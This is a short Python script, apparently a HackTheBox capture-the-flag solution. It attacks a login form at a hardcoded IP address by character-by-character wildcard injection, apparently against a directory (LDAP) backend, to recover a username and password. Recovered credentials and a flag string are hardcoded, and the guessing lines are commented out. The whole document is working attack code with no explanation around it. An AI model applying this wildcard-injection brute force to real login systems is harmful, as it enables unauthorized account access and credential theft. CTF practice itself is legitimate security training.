from string import ascii_lowercase, ascii_uppercase, digits
import requests
from bs4 import BeautifulSoup

char = ascii_lowercase + ascii_uppercase + digits + "}" + "{" + "_"
url = "http://159.65.48.79:30645/login"
username = ""
password = ""

number = 0
while number < 67:
	for i in char:
		#user = username + f"{i}*"
		user = "rEesE"
		#passwd = password + f"{i}*"
		passwd = "HTB{d1rectory_h4xx0r_is_k00l}"
		data = {"username": user, "password": passwd}

		r = requests.post(url, data=data)
		soup = BeautifulSoup(r.content, "html5lib")
		try:
			parser = soup.find('p').text
			if "No search results." in parser:
				#username += i
				password += i
				number -= number
				#print(f"[+] Found Username = {username} !")
				print(f"[+] Found Password = {password} !")
		except:
			number += 1